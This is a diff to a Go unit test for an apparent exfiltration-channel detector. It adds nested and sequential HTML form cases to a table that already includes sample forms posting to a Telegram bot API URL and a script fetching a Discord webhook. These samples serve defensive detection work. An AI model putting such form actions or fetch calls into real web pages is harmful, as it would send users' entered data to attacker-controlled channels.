@@ -59,6 +59,8 @@ func TestExfilChannel(t *testing.T) {
 		{"폼액션", `<form action="https://api.telegram.org/bot1/x"></form>`, 1},
 		{"디스코드", `<script>fetch("https://discord.com/api/webhooks/1")</script>`, 1},
 		{"정상폼", `<form action="/login"></form>`, 0},
+		{"중첩폼무시", `<form action="/login"><form action="https://api.telegram.org/bot1/x"></form></form>`, 0},
+		{"앞폼닫힌뒤", `<form action="/login"></form><form action="https://api.telegram.org/bot1/x"></form>`, 1},
 		{"정상스크립트", `<script>fetch("/api/data")</script>`, 0},
 		{"본문텍스트는아님", `<p>api.telegram.org</p>`, 0},
 	}
